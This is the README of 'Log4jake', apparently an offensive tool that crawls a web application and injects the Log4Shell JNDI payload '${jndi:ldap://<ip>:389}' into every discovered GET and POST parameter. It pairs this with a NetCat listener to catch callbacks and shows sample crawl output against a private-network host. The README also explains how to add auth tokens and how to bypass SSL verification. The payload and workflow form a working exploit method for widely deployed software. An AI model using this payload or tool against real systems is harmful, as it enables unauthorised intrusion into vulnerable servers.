# Log4jake

Log4jake works by spidering a web application for GET/POST requests. It will then automatically execute the GET/POST requests, filling any discovered parameters with the ${jndi:ldap://<ip>:389} Log4j payload. Note that this tool is designed to work simultaneously with a NetCat listener.
  
If you want to test behind authentication, use the commented '#req.add_header('Authorization', "token_goes_here")' line to add the proper token. If you are experiencing SSL errors, use the commented '#context = ssl._create_unverified_context()' line in addition to 'resp = urllib.request.urlopen(req, context=context)'
  
  Syntax:
```
  └─$ python3 log4jake.py https://10.10.3.50
Remember to start NetCat Listener on port 389!!!
Enter IP address of your Listener: 10.10.3.4  

Starting Web Spider
-------------------

SPIDERING -> https://10.10.3.50/
SPIDERING -> https://10.10.3.50/signup
POST /signup
SPIDERING -> https://10.10.3.50/login
POST /login_exec
SPIDERING -> https://10.10.3.50/clients
SPIDERING -> https://10.10.3.50/admin/website
SPIDERING -> https://10.10.3.50/cdn-cgi/l/email-protection#9ef4f1f0defdf8ffedf7eafbedb0fdf1f3
SPIDERING -> https://10.10.3.50/forgotpassword
POST /mailer5

```
